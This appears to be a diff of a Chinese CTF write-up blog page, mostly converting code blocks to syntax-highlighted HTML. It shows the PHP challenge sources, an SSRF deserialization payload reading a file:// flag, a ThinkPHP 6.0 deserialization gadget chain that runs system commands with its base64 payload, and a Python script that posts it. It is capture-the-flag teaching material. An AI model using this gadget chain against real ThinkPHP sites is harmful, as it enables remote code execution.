@@ -34,6 +34,8 @@
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753613.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753578.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753997.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754303.png">
+<meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754149.png">
 <meta property="article:published_time" content="2024-02-19T02:01:29.000Z">
 <meta property="article:modified_time" content="2024-08-22T09:54:46.365Z">
 <meta property="article:author" content="p0l1st">
@@ -447,56 +449,56 @@
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221752298.png" alt="image-20240218202359704"></p>
 <p>RCE</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753751.png" alt="image-20240218202519654"></p>
-<h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><pre><code class="php">&lt;?php
-highlight_file(__file__);
-error_reporting(0);
-function get($url) &#123;
-    $curl = curl_init();
-    curl_setopt($curl, CURLOPT_URL, $url);
-    curl_setopt($curl, CURLOPT_HEADER, 0);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $data = curl_exec($curl);
-    curl_close($curl);
-    echo base64_encode($data);
-    return $data;
-&#125;
-class client&#123;
-    public $url;
-    public $payload;
-    public function __construct()
-    &#123;
-        $url = &quot;http://127.0.0.1/&quot;;
-        $payload = &quot;system(\&quot;cat /flag\&quot;);&quot;;
-        echo &quot;Exploit&quot;;
-    &#125;
-    public function __destruct()
-    &#123;
-        get($this-&gt;url);
-    &#125;
-&#125;
-// hint:hide other file
-if(isset($_GET[&#39;Harder&#39;])) &#123;
-    unserialize($_GET[&#39;Harder&#39;]);
-&#125; else &#123;
-    echo &quot;You don&#39;t know how to pass parameters?&quot;;
-&#125;
+<h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">client</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/"</span><span class="token punctuation">;</span>
+        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system(\"cat /flag\");"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Exploit"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// hint:hide other file</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Harder'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Harder'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You don't know how to pass parameters?"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-?&gt; 
-</code></pre>
+<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>flag在html&#x2F;flag.php</p>
 <p>构造exp</p>
-<pre><code class="php">&lt;?php
-class client
-&#123;
-    public $url=&quot;file:///var/www/html/flag.php&quot;;
-    public $payload;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">client</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token operator">=</span><span class="token string double-quoted-string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>
 
-&#125;
-$a = new client();
-echo serialize($a);
-</code></pre>
-<pre><code>O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;s:7:&quot;payload&quot;;N;&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;s:7:&quot;payload&quot;;N;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>base64解码</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753878.png" alt="image-20240218202938028"></p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753829.png" alt="image-20240218202946529"></p>
@@ -508,151 +510,160 @@ echo serialize($a);
 <p>Model.php，发现flag所在文件</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753578.png" alt="image-20240218203556909"></p>
 <p>直接用tp6.0的链子打反序列化</p>
-<pre><code class="php">&lt;?php
-namespace think\model\concern;
-trait Attribute
-&#123;
-    private $data = [&quot;key&quot;=&gt;&quot;cat /Oyst3333333r.php&quot;];
-    private $withAttr = [&quot;key&quot;=&gt;&quot;system&quot;];
-&#125;
-namespace think;
-abstract class Model
-&#123;
-    use model\concern\Attribute;
-    private $lazySave = true;
-    protected $withEvent = false;
-    private $exists = true;
-    private $force = true;
-    protected $name;
-    public function __construct($obj=&quot;&quot;)&#123;
-        $this-&gt;name=$obj;
-    &#125;
-&#125;
-namespace think\model;
-use think\Model;
-class Pivot extends Model
-&#123;&#125;
-$a=new Pivot();
-$b=new Pivot($a);
-echo base64_encode(serialize($b));
-</code></pre>
-<pre><code>TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319
-</code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>
+<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"cat /Oyst3333333r.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>
+<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$obj</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>exp</p>
-<pre><code class="python">import requests
-from io import BytesIO
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
 
-data = &#123;
-    &#39;key&#39;: &#39;a&#39; * 1000000+&#39;603THINKPHP&#39;,
-    &#39;payload&#39;:&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;
-&#125;
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1000000</span><span class="token operator">+</span><span class="token string">'603THINKPHP'</span><span class="token punctuation">,</span>
+    <span class="token string">'payload'</span><span class="token punctuation">:</span><span class="token string">"TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319"</span>
+<span class="token punctuation">&#125;</span>
 
-res = requests.post(&#39;http://yuanshen.life:38972/?left=QNKCDZO&amp;right=240610708&#39;, data=data)
-print(res.text)
-</code></pre>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://yuanshen.life:38972/?left=QNKCDZO&amp;right=240610708'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221753997.png" alt="image-20240218204013287"></p>
-<h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><pre><code class="php">&lt;?php
+<h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-highlight_file(__FILE__);
-class start
-&#123;
-    public $welcome;
-    public $you;
-    public function __destruct()
-    &#123;
-        $this-&gt;begin0fweb();
-    &#125;
-    public  function begin0fweb()
-    &#123;
-        $p=&#39;hacker!&#39;;
-        $this-&gt;welcome-&gt;you = $p;
-    &#125;
-&#125;
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">start</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$welcome</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$you</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">begin0fweb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function-definition function">begin0fweb</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$p</span><span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">welcome</span><span class="token operator">-></span><span class="token property">you</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-class SE&#123;
-    public $year;
-    public function __set($name, $value)&#123;
-        echo &#39;  Welcome to new year!  &#39;;
-        echo($this-&gt;year);
-    &#125;
-&#125;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">SE</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$year</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'  Welcome to new year!  '</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">year</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-class CR &#123;
-    public $last;
-    public $newyear;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">CR</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$last</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$newyear</span><span class="token punctuation">;</span>
 
-    public function __tostring() &#123;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 
-        if (is_array($this-&gt;newyear)) &#123;
-            echo &#39;nonono&#39;;
-            return false;
-        &#125;
-        if (!preg_match(&#39;/worries/i&#39;,$this-&gt;newyear))
-        &#123;
-            echo &quot;empty it!&quot;;
-            return 0;
-        &#125;
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">newyear</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/worries/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">newyear</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"empty it!"</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        if(preg_match(&#39;/^.*(worries).*$/&#39;,$this-&gt;newyear)) &#123;
-            echo &#39;Don\&#39;t be worry&#39;;
-        &#125; else &#123;
-            echo &#39;Worries doesn\&#39;t exists in the new year  &#39;;
-            empty($this-&gt;last-&gt;worries);
-        &#125;
-        return false;
-    &#125;
-&#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^.*(worries).*$/'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">newyear</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Don\'t be worry'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Worries doesn\'t exists in the new year  '</span><span class="token punctuation">;</span>
+            <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">last</span><span class="token operator">-></span><span class="token property">worries</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
-class ET&#123;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">ET</span><span class="token punctuation">&#123;</span>
 
-    public function __isset($name)
-    &#123;
-        foreach ($_GET[&#39;get&#39;] as $inject =&gt; $rce)&#123;
-            putenv(&quot;&#123;$inject&#125;=&#123;$rce&#125;&quot;);
-        &#125;
-        system(&quot;echo \&quot;Haven&#39;t you get the secret?\&quot;&quot;);
-    &#125;
-&#125;
-if(isset($_REQUEST[&#39;go&#39;]))&#123;
-    unserialize(base64_decode($_REQUEST[&#39;go&#39;]));
-&#125; 
-</code></pre>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$inject</span> <span class="token operator">=></span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$inject</span><span class="token punctuation">&#125;</span></span>=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$rce</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo \"Haven't you get the secret?\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
